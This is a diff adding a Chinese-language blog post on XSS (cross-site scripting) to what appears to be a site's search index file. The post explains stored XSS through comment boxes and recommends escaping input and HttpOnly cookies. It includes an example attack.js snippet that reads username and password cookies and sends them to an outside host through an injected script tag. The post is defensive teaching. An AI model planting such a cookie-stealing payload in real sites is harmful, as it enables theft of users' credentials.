@@ -14634,4 +14634,30 @@ API
         <tag>wisper</tag>
       </tags>
   </entry>
+  <entry>
+    <title>XSS攻击</title>
+    <url>/2023/08/27/XSS%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<p>今天学习了一个网络攻击的手段，XSS攻击技术，大家自建网站的朋友，记得看看是否有此漏洞。</p>
+<span id="more"></span>
+
+<p>🎈 XSS 攻击<br>全称跨站脚本攻击 <code>Cross Site Scripting</code>。<br>为了与重叠样式表 CSS 进行区分，所以换了另一个缩写名称 XSS。<br>XSS攻击者通过篡改网页，注入恶意的 HTML 脚本，一般是 javascript，在用户浏览网页时，控制用户浏览器进行恶意操作的一种攻击方式。<br>XSS 攻击经常使用在论坛，博客等应用中。攻击者可以偷取用户Cookie、密码等重要数据，进而伪造交易、盗取用户财产、窃取情报等私密信息。</p>
+<p><img src="/2023/08/27/XSS%E6%94%BB%E5%87%BB/xss1.png" alt="xss-attack-1"></p>
+<p>就像上图，如果用户在评论框中输入的并不是正常的文本，而是一段 javascript 脚本，而后台又没对该用户的数据进行处理，直接存入数据库，那么当其他用户过来访问该页面，浏览器必然会执行这段脚本<br>当然这只是恶趣味，而真正的黑客并不会仅仅满足这样的恶趣味，可能更多的是想通过这些 注入脚本，获取你的 个人信息 ，甚至是你的账号密码等信息。</p>
+<p><img src="/2023/08/27/XSS%E6%94%BB%E5%87%BB/xss2.png" alt="xss-attack-2"></p>
+<p>由上图可知，用户其实在评论的时候，引入了一个第三方脚本，在这个脚本中获取你浏览器的 cookie 信息，并发送到指定的接口进行保存处理，这样你的信息就已经泄露了:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// attack.js 中的逻辑</span><br><span class="line">var uname = $.cookie(&#x27;username&#x27;); // 获取账号</span><br><span class="line">var pwd = $.cookie(&#x27;password&#x27;); // 获取密码</span><br><span class="line"></span><br><span class="line">// 发送请求</span><br><span class="line">$(&#x27;body&#x27;).appendTo(&#x27;&lt;script src=`http://autofelix.com/index.php?username=$&#123;uname&#125;&amp;password=$&#123;pwd&#125;`&gt;&lt;/script&gt;&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在上面逻辑中，脚本中获取了你的个人信息，并将你的个人信息发送到后端 php 文件中进行处理保存，这样你的个人信息就已经泄露了，所以杜绝 xss攻击 在网络安全中非常的重要<br>所以后端永远不要相信用户提交的数据，在接收用户提交的信息时候，要进行 消毒处理<br>也就是过滤一些特殊的字符，比如 javascript 脚本中的 &lt;&gt; 进行转移 &lt;&gt; 再进行存储，这样就能有效的进行 xss 攻击的预防<br>另外如果 cookie 中设置了 HttpOnly 属性，那么通过 js 脚本将无法读取到cookie 信息，这样也能有效的防止 XSS 攻击窃取 cookie 内容</p>
+<p><img src="/2023/08/27/XSS%E6%94%BB%E5%87%BB/xss3.jpeg" alt="xss-attack-3"></p>
+<hr>
+<p><b>好记性不如烂笔头。</b></p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
 </search>
